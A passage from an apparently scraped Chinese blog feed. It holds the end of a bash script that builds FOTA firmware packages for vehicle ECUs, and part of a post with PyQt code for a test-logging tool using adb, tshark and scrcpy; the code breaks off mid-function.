&gt;&gt; ./FotaPackageTool/ics_fota_EMS_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_EMS_1.log; then echo &quot;捕捉到ics_fota_EMS_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) # 拷贝一次空的config_fota文件，写入EMS版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_EMS_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_EMS_2.log; then echo &quot;捕捉到ics_fota_EMS_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_EMS.tar.gz unset latest_dir } # 打包所有 funPackageALL(){ echo &quot;开始打包全部&quot; &gt;&gt; ./FotaPackageTool/package.log # 将binfiles中的.bin和tar.gz和.zip拷贝到module目录 cp ./FotaPackageTool/binfiles/* ./module # 拷贝一次空的config_fota文件，写入全部ECU版本的文件名 hmi_tar_file=$(cd ./module &amp;&amp; ls hmi*.tar) mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) tbox2_tar_file=$(cd ./module &amp;&amp; ls TB2*.tar.gz) ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/ad-video = \\&quot;\\&quot;/ad-video = \\&quot;$hmi_tar_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX2-MPU = \\&quot;\\&quot;/TBOX2-MPU = \\&quot;$tbox2_tar_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC1 = \\&quot;\\&quot;/DCDC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC2 = \\&quot;\\&quot;/DCDC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC3 = \\&quot;\\&quot;/DCDC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC4 = \\&quot;\\&quot;/DCDC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC1 = \\&quot;\\&quot;/ACDC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC2 = \\&quot;\\&quot;/ACDC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # 开始打包全部 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_ALL.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_ALL.log; then echo &quot;捕捉到ics_fota_ALL日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_ALL.tar.gz unset latest_dir } # 打包所有（不含HMI和TBOX2） funPackageALLNoHMITB2(){ echo &quot;开始打包全部&quot; &gt;&gt; ./FotaPackageTool/package.log # 将binfiles中的.bin和tar.gz和.zip拷贝到module目录 cp ./FotaPackageTool/binfiles/* ./module # 拷贝一次空的config_fota文件，写入全部ECU版本的文件名 mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC1 = \\&quot;\\&quot;/DCDC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC2 = \\&quot;\\&quot;/DCDC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC3 = \\&quot;\\&quot;/DCDC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC4 = \\&quot;\\&quot;/DCDC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC1 = \\&quot;\\&quot;/ACDC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC2 = \\&quot;\\&quot;/ACDC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # 开始打包全部 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_ALL_NO_HMI_TB2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_ALL_NO_HMI_TB2.log; then echo &quot;捕捉到ics_fota_ALL日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_ALL.tar.gz unset latest_dir } # 打包所有(不含TBOX2) funPackageALLNOTB2(){ echo &quot;开始打包全部&quot; &gt;&gt; ./FotaPackageTool/package.log # 将binfiles中的.bin和tar.gz和.zip拷贝到module目录 cp ./FotaPackageTool/binfiles/* ./module # 拷贝一次空的config_fota文件，写入全部ECU版本的文件名 hmi_tar_file=$(cd ./module &amp;&amp; ls hmi*.tar) mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) tbox2_tar_file=$(cd ./module &amp;&amp; ls TB2*.tar.gz) ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/ad-video = \\&quot;\\&quot;/ad-video = \\&quot;$hmi_tar_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC1 = \\&quot;\\&quot;/DCDC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC2 = \\&quot;\\&quot;/DCDC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC3 = \\&quot;\\&quot;/DCDC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC4 = \\&quot;\\&quot;/DCDC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC1 = \\&quot;\\&quot;/ACDC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC2 = \\&quot;\\&quot;/ACDC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # 开始打包全部 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_ALL_NO_TB2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_ALL_NO_TB2.log; then echo &quot;捕捉到ics_fota_ALL日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_ALL.tar.gz unset latest_dir } # 入口 funCreateDir echo &quot;请将HMI的.tar;TBOX1的.zip;TBOX2的.tar.gz;ACDC,DCDC,HCU,CMU,MCU的.hex;BMU,CCU,EMS,SECC的.s19上传至FotaPackageTool/module_tmp目录&quot; echo &quot;开始打包后module目录将会被清空！&quot; echo &quot;请输入 0:退出 1:开始打包全部 2.开始打包[不含HMI和TBOX2] 3.开始打包[不含TBOX2]&quot; read num if [ $num -eq 1 ] then echo &quot;开始清理module目录和FotaPackageTool/binfiles中转目录&quot; rm ./FotaPackageTool/*.log funClearModule funClearBinfiles funClearOldFotaPackage funUpdatePackageTime echo &quot;开始打包HMI&quot; funPackageHMI funMoveTar echo &quot;开始打包TBOX1&quot; funPackageTBOX1 funMoveBin funMoveZip echo &quot;开始打包TBOX2&quot; funClearModule funPackageTBOX2 funMoveTar echo &quot;开始打包CCU&quot; funClearModule funPackageCCU funMoveBin echo &quot;开始打包SECC&quot; funClearModule funPackageSECC funMoveBin echo &quot;开始打包HCU&quot; funClearModule funPackageHCU funMoveBin echo &quot;开始打包ACDC和DCDC&quot; funClearModule funPackagePM funMoveBin echo &quot;开始打包CMU&quot; funClearModule funPackageCMU funMoveBin echo &quot;开始打包BMS&quot; funClearModule funPackageBMS funMoveBin echo &quot;开始打包EMS&quot; funClearModule funPackageEMS funMoveBin echo &quot;开始打包全部&quot; funClearModule funPackageALL mv /home/admin/ics_fota/FotaPackageTool/*.tar.gz /home/ICS/FTPHOME/ echo &quot;打包完成,日志文件在FotaPackageTool目录内,FOTA包已移动至FTP目录/home/ICS/FTPHOME/&quot; elif [ $num -eq 0 ] then exit elif [ $num -eq 2 ] then echo &quot;开始清理module目录和FotaPackageTool/binfiles中转目录&quot; rm ./FotaPackageTool/*.log funClearModule funClearBinfiles funClearOldFotaPackage funUpdatePackageTime echo &quot;开始打包TBOX1&quot; funPackageTBOX1 funMoveBin funMoveZip echo &quot;开始打包CCU&quot; funClearModule funPackageCCU funMoveBin echo &quot;开始打包SECC&quot; funClearModule funPackageSECC funMoveBin echo &quot;开始打包HCU&quot; funClearModule funPackageHCU funMoveBin echo &quot;开始打包ACDC和DCDC&quot; funClearModule funPackagePM funMoveBin echo &quot;开始打包CMU&quot; funClearModule funPackageCMU funMoveBin echo &quot;开始打包BMS&quot; funClearModule funPackageBMS funMoveBin echo &quot;开始打包EMS&quot; funClearModule funPackageEMS funMoveBin echo &quot;开始打包全部&quot; funClearModule funPackageALLNoHMITB2 mv /home/admin/ics_fota/FotaPackageTool/*.tar.gz /home/ICS/FTPHOME/ echo &quot;打包完成,日志文件在FotaPackageTool目录内,FOTA包已移动至FTP目录/home/ICS/FTPHOME/&quot; elif [ $num -eq 3 ] then echo &quot;开始清理module目录和FotaPackageTool/binfiles中转目录&quot; rm ./FotaPackageTool/*.log funClearModule funClearBinfiles funClearOldFotaPackage funUpdatePackageTime echo &quot;开始打包HMI&quot; funPackageHMI funMoveTar echo &quot;开始打包TBOX1&quot; funPackageTBOX1 funMoveBin funMoveZip echo &quot;开始打包CCU&quot; funClearModule funPackageCCU funMoveBin echo &quot;开始打包SECC&quot; funClearModule funPackageSECC funMoveBin echo &quot;开始打包HCU&quot; funClearModule funPackageHCU funMoveBin echo &quot;开始打包ACDC和DCDC&quot; funClearModule funPackagePM funMoveBin echo &quot;开始打包CMU&quot; funClearModule funPackageCMU funMoveBin echo &quot;开始打包BMS&quot; funClearModule funPackageBMS funMoveBin echo &quot;开始打包EMS&quot; funClearModule funPackageEMS funMoveBin echo &quot;开始打包全部&quot; funClearModule funPackageALLNOTB2 mv /home/admin/ics_fota/FotaPackageTool/*.tar.gz /home/ICS/FTPHOME/ echo &quot;打包完成,日志文件在FotaPackageTool目录内,FOTA包已移动至FTP目录/home/ICS/FTPHOME/&quot; else echo &quot;输入有误&quot; fi ","link":"https://hellogu.github.io/post/zi-dong-fota-da-bao-jiao-ben/"},{"title":"使用pyqt开发一个工作效率工具TBox_Log_Tool","content":"pyqt在实际工作中的应用 以往手工测试时的低效点 每执行一条用例都需要打开三个CMD窗口分别记录 adb log、service log和监看OCPP log，每次执行完一条用例都需要重新在CMD窗口输入adb命令，非常繁琐 每执行一条用例都需要记录以太网报文，并且在wireshark中点击另存以太网报文 测试设备在1L车间中，冬冷夏热，测试时需要频繁进出空调间去操作设备的HMI，插拔设备的SIM卡 通过该工具，改进了以上的三个点 只需要简单的点击就可以同时记录3种 log 支持对开发板射频模块的打开和关闭 集成了开源项目scrcpy，使测试人员在电脑上实现对充电桩操作界面的远程控制 待优化的功能(公司倒闭，不用优化了🤡) 使用python多线程对adb设备的意外断开做处理 工具效果展示与功能讲解 第一行控制测试设备（TBox）的连接状态，如连接了多个adb设备，可在下拉列表中选择TBox设备 第二行是用serial库来对TBox发送指定的AT命令来启用/禁用射频模块，达到使TBox在线/离线的效果 第二行的“连接HMI”使用scrcpy工具来对HMI进行投屏操作，方便测试人员在电脑上操作和观察HMI 第三行日志名中一般填入用例编号，如果用例多次执行，程序会自动在新的log文件名中加入“_1”、“_2”以此类推 第四行使用Tshark列出电脑上所有的网卡，勾选“录制以太网报文”后再点击“开始录制”会同步记录wireshark报文 第四行的“弹出ocpplog”点击后会弹出ocpplog的实时监看窗口 使用pyinstaller对程序进行打包后即可生成exe可执行文件 具体实现 import sys import time import os import subprocess import serial as ser import configparser import datetime from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QLineEdit, QVBoxLayout, QHBoxLayout, QComboBox, QMessageBox,QCheckBox class LogRecorder(QWidget): def __init__(self): super().__init__() self.devices = [] self.device = None self.case_name = None self.logcat_process = None self.ocpplog_process = None self.init_ui() def init_ui(self): self.setWindowTitle(&quot;TBox Log Tool&quot;) # 创建控件 device_label = QLabel(&quot;ADB设备:&quot;) self.device_combo = QComboBox() self.refresh_button = QPushButton(&quot;刷新&quot;) self.connect_button = QPushButton(&quot;连接&quot;) self.disconnect_button = QPushButton(&quot;断开&quot;) self.disconnect_button.setEnabled(False) case_label = QLabel(&quot;日志名:&quot;) self.case_edit = QLineEdit() self.case_edit.setEnabled(False) self.record_button = QPushButton(&quot;开始录制&quot;) self.record_button.setEnabled(False) self.stop_button = QPushButton(&quot;停止录制&quot;) self.stop_button.setEnabled(False) atport_label = QLabel(&quot;AT COM口:&quot;) self.atport_edit = QLineEdit() self.offline_button = QPushButton(&quot;关闭射频模块&quot;) self.online_button = QPushButton(&quot;打开射频模块&quot;) self.online_button.setEnabled(False) self.hmi_button = QPushButton(&quot;连接HMI&quot;) net_label = QLabel(&quot;选择网口:&quot;) self.net_device_combo = QComboBox() self.net_capture_enable = QCheckBox(&quot;录制以太网报文&quot;) self.ocpplog_button = QPushButton(&quot;弹出ocpplog&quot;) self.ocpplog_button.setEnabled(False) # 布局控件 device_layout = QHBoxLayout() device_layout.addWidget(device_label) device_layout.addWidget(self.device_combo) device_layout.addWidget(self.refresh_button) device_layout.addWidget(self.connect_button) device_layout.addWidget(self.disconnect_button) offline_layout = QHBoxLayout() offline_layout.addWidget(atport_label) offline_layout.addWidget(self.atport_edit) offline_layout.addWidget(self.offline_button) offline_layout.addWidget(self.online_button) offline_layout.addWidget(self.hmi_button) case_layout = QHBoxLayout() case_layout.addWidget(case_label) case_layout.addWidget(self.case_edit) case_layout.addWidget(self.record_button) case_layout.addWidget(self.stop_button) netcapure_layout = QHBoxLayout() netcapure_layout.addWidget(net_label) netcapure_layout.addWidget(self.net_device_combo) netcapure_layout.addWidget(self.net_capture_enable) netcapure_layout.addWidget(self.ocpplog_button) main_layout = QVBoxLayout() main_layout.addLayout(device_layout) main_layout.addLayout(offline_layout) main_layout.addLayout(case_layout) main_layout.addLayout(netcapure_layout) self.setLayout(main_layout) # 绑定事件 self.refresh_button.clicked.connect(self.refresh_devices) self.connect_button.clicked.connect(self.connect_device) self.disconnect_button.clicked.connect(self.disconnect_device) self.offline_button.clicked.connect(self.offline) self.online_button.clicked.connect(self.online) self.hmi_button.clicked.connect(self.connect_hmi) self.record_button.clicked.connect(self.start_record) self.stop_button.clicked.connect(self.stop_record) self.ocpplog_button.clicked.connect(self.open_ocpp) # 初始化设备列表 self.refresh_devices() self.refresh_net_devices() # print(self.initInterfaceDict()) def getConfigValue(self, name): # 获取config.ini中的配置 当前配置项只有一个tshark路径 self.config = configparser.ConfigParser() self.config.read('config.ini') value = self.config.get(&quot;config&quot;, name) return value def refresh_devices(self): # 刷新设备列表 devices = self.get_devices() if devices != self.devices: self.devices = devices self.device_combo.clear() self.device_combo.addItems(self.devices) def get_devices(self): # 获取设备列表 devices = [] try: if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None output = subprocess.check_output([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;devices&quot;],startupinfo=startupinfo).decode(&quot;utf-8&quot;) for line in output.splitlines()[1:]: if line.strip(): devices.append(line.split(&quot;\\t&quot;)[0]) except subprocess.CalledProcessError: pass return devices def refresh_net_devices(self): # 刷新设备列表 net_devices = self.initInterfaceDict() # print(net_devices) # if net_devices != self.initInterfaceDict: self.net_devices = net_devices # self.net_device_combo.clear() self.net_device_combo.addItems(self.net_devices) # print(net_devices) def initInterfaceDict(self): # 获取接口列表 tshark_path = self.getConfigValue(&quot;tshark_path&quot;) cmd = f'{tshark_path} -D' # cmd = '&quot;C:/Program Files/Wireshark/tshark.exe&quot; -D' result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) interfaceList = result.stdout.decode().strip().split('\\r\\n') # print(interfaceList) interfaceList_dict = {} for item in interfaceList: key = item.split('(', 1)[1].strip(') ') # 获取括号中的内容 value_list = [s for s in item.split() if s.startswith('\\\\')] if value_list: # 检查列表是否为空 value = value_list[0] # 获取以&quot;\\\\Device\\\\&quot;开头的字符串 interfaceList_dict[key] = value # print(interfaceList_dict) return interfaceList_dict def connect_device(self): # 连接设备 self.device = self.device_combo.currentText() if not self.device: QMessageBox.warning(self, &quot;警告&quot;, &quot;请选择一个设备&quot;) return try: # subprocess.check_output([&quot;adb&quot;, 